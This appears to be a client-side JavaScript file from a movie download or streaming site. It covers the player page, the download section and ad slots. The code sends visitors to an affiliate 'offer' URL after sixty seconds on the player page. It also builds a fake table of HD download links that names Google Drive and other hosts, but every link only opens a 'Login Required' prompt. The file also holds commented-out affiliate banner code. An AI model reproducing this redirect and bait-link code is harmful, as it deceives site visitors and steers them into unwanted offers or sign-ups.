function openSecureLink() {
  location.href = 'https://see.kmisln.com/offer?prod=1&ref=5231896';
}

if(document.getElementById('player')) {
  setTimeout(function() {
    openSecureLink();
  },6e4);
}

if(document.getElementById('movie-year')) {
  if(document.getElementById('movie-year').innerHTML <= new Date().getFullYear()) {
    var mtl = 'Login Required !!!';
    document.getElementById('movie-download').innerHTML = `<table>
      <thead>
        <tr>
          <th>Download Links</th>
          <th>Server</th>
          <th>Quality</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><strong><a href="javascript:void(0)" onclick="openLogin('${mtl}')"><i class="fa fa-download"></i> Options 1</a></strong></td>
          <td><img class="lazyload" style="margin-bottom: 0px !important;" data-src="https://www.google.com/s2/favicons?domain=Drive.Google.com"> drive.google.com</td>
          <td>HD</td>
        </tr>
        <tr>
          <td><strong><a href="javascript:void(0)" onclick="openLogin('${mtl}')"><i class="fa fa-download"></i> Options 2</a></strong></td>
          <td><img class="lazyload" style="margin-bottom: 0px !important;" data-src="https://www.google.com/s2/favicons?domain=Acefile.co"> Acefile.co</td>
          <td>HD</td>
        </tr>
        <tr>
          <td><strong><a href="javascript:void(0)" onclick="openLogin('${mtl}')"><i class="fa fa-download"></i> Options 3</a></strong></td>
          <td><img class="lazyload" style="margin-bottom: 0px !important;" data-src="https://www.google.com/s2/favicons?domain=Uptobox.com"> Uptobox.com</td>
          <td>HD</td>
        </tr>
        <tr>
          <td><strong><a href="javascript:void(0)" onclick="openLogin('${mtl}')"><i class="fa fa-download"></i> Options 4</a></strong></td>
          <td><img class="lazyload" style="margin-bottom: 0px !important;" data-src="https://www.google.com/s2/favicons?domain=Fembed.com"> Fembed.com</td>
          <td>HD</td>
        </tr>
        <tr>
          <td><strong><a href="javascript:void(0)" onclick="openLogin('${mtl}')"><i class="fa fa-download"></i> Options 5</a></strong></td>
          <td><img class="lazyload" style="margin-bottom: 0px !important;" data-src="https://www.google.com/s2/favicons?domain=Racaty.com"> Racaty.com</td>
          <td>HD</td>
        </tr>
      </tbody>
    </table>`;
  }
}

if(document.getElementById('sidebar-widget')) {
  var widget = $('#sidebar-widget');
  widget.append(`<div class="widget">
      <iframe class="lazyload" data-src="https://imgfo.com/featured-box-embed.html" width="300px" height="250px" frameborder="0" scrolling="no"></iframe>
    </div>`);
  widget.append(`<div class="widget">
    <a href="/contact">
      <img data-src="https://via.placeholder.com/300" class="img-fluid lazyload">
    </a>
  </div>`);
}

if(document.getElementById('ads-search-top')) {
    var div = $('#ads-search-top');
    div.hide();
//     div.append(`<div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/qgGCfim.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyi.com/i8td5w27b4?url_id=0&aff_id=94964&offer_id=6684&bo=3511,3512,3521,3522&file_id=390834')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/PFLHstn.gif" width="300" height="100" border="0" onclick="window.open('https://t.frtyz.com/akl9ibqbb4?url_id=0&aff_id=94964&offer_id=6132&bo=3511,3512,3521,3522&file_id=407364')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/jFjT9q2.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyi.com/hufuauox8g?url_id=0&aff_id=94964&offer_id=4632&bo=3511,3512,3521,3522&file_id=327804')"/>
//   </div>`);
}

if(document.getElementById('ads-search-bottom')) {
    var div = $('#ads-search-bottom');
    div.hide();
//     div.append(`<div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/qgGCfim.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyi.com/i8td5w27b4?url_id=0&aff_id=94964&offer_id=6684&bo=3511,3512,3521,3522&file_id=390834')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/PFLHstn.gif" width="300" height="100" border="0" onclick="window.open('https://t.frtyz.com/akl9ibqbb4?url_id=0&aff_id=94964&offer_id=6132&bo=3511,3512,3521,3522&file_id=407364')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/jFjT9q2.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyi.com/hufuauox8g?url_id=0&aff_id=94964&offer_id=4632&bo=3511,3512,3521,3522&file_id=327804')"/>
//   </div>`);
}

if(document.getElementById('ads-list-top')) {
    var div = $('#ads-list-top');
    div.hide();
//     div.append(`<div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/qgGCfim.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyi.com/i8td5w27b4?url_id=0&aff_id=94964&offer_id=6684&bo=3511,3512,3521,3522&file_id=390834')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/PFLHstn.gif" width="300" height="100" border="0" onclick="window.open('https://t.frtyz.com/akl9ibqbb4?url_id=0&aff_id=94964&offer_id=6132&bo=3511,3512,3521,3522&file_id=407364')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/jFjT9q2.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyi.com/hufuauox8g?url_id=0&aff_id=94964&offer_id=4632&bo=3511,3512,3521,3522&file_id=327804')"/>
//   </div>`);
}

if(document.getElementById('ads-list-bottom')) {
    var div = $('#ads-list-bottom');
    div.hide();
//     div.append(`<div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/qgGCfim.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyi.com/i8td5w27b4?url_id=0&aff_id=94964&offer_id=6684&bo=3511,3512,3521,3522&file_id=390834')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/PFLHstn.gif" width="300" height="100" border="0" onclick="window.open('https://t.frtyz.com/akl9ibqbb4?url_id=0&aff_id=94964&offer_id=6132&bo=3511,3512,3521,3522&file_id=407364')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/jFjT9q2.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyi.com/hufuauox8g?url_id=0&aff_id=94964&offer_id=4632&bo=3511,3512,3521,3522&file_id=327804')"/>
//   </div>`);
}

if(document.getElementById('ads-top-content')) {
    var div = $('#ads-top-content');
    div.hide();
//     div.append(`<div class="col-lg-6 col-md-6">
//     <script type="text/javascript" data-cfasync="false" async src="https://poweredby.jads.co/js/jads.js"></script>
//     <ins id="820528" data-width="300" data-height="62"></ins>
//     <script type="text/javascript" data-cfasync="false" async>(adsbyjuicy = window.adsbyjuicy || []).push({'adzone':820528});</script>
//   </div>
//   <div class="col-lg-6 col-md-6">
//     <script type="text/javascript" data-cfasync="false" async src="https://poweredby.jads.co/js/jads.js"></script>
//     <ins id="820529" data-width="300" data-height="62"></ins>
//     <script type="text/javascript" data-cfasync="false" async>(adsbyjuicy = window.adsbyjuicy || []).push({'adzone':820529});</script>
//   </div>`);
}

if(document.getElementById('ads-after-content')) {
    var div = $('#ads-after-content');
    div.hide();
//     div.append(`<div class="col-lg-6 col-md-6">
//     <script type="text/javascript" data-cfasync="false" async src="https://poweredby.jads.co/js/jads.js"></script>
//     <ins id="820524" data-width="300" data-height="112"></ins>
//     <script type="text/javascript" data-cfasync="false" async>(adsbyjuicy = window.adsbyjuicy || []).push({'adzone':820524});</script>
// </div>
// <div class="col-lg-6 col-md-6">
//     <script type="text/javascript" data-cfasync="false" async src="https://poweredby.jads.co/js/jads.js"></script>
//     <ins id="820527" data-width="300" data-height="112"></ins>
//     <script type="text/javascript" data-cfasync="false" async>(adsbyjuicy = window.adsbyjuicy || []).push({'adzone':820527});</script>
// </div>`);
}

if(document.getElementById('ads-index-top')) {
    var div = $('#ads-index-top');
    div.hide();
//     div.append(`<div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/qgGCfim.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyi.com/i8td5w27b4?url_id=0&aff_id=94964&offer_id=6684&bo=3511,3512,3521,3522&file_id=390834')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/PFLHstn.gif" width="300" height="100" border="0" onclick="window.open('https://t.frtyz.com/akl9ibqbb4?url_id=0&aff_id=94964&offer_id=6132&bo=3511,3512,3521,3522&file_id=407364')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/jFjT9q2.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyi.com/hufuauox8g?url_id=0&aff_id=94964&offer_id=4632&bo=3511,3512,3521,3522&file_id=327804')"/>
//   </div>`);
}

if(document.getElementById('ads-index-bottom')) {
    var div = $('#ads-index-bottom');
    div.hide();
//     div.append(`<div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/aWjCEoT.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyh.com/r9kvcg716o?url_id=0&aff_id=94964&offer_id=5471&bo=3511,3512,3521,3522&file_id=300517')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/KxWzDNp.gif" width="300" height="100" border="0" onclick="window.open('https://t.hrtyj.com/vvt37usbuo?url_id=0&aff_id=94964&offer_id=2990&bo=3511,3512,3521,3522&file_id=216369')" />
//   </div>
//   <div class="col-lg-4 col-md-6">
//     <img class="mb-2 lazyload" data-src="https://i.imgur.com/za2th8q.gif" width="300" height="100" border="0" onclick="window.open('https://t.grtyh.com/921j7fx9kw?url_id=0&aff_id=94964&offer_id=5469&bo=3511,3512,3521,3522&file_id=300547')" />
//   </div>`);
}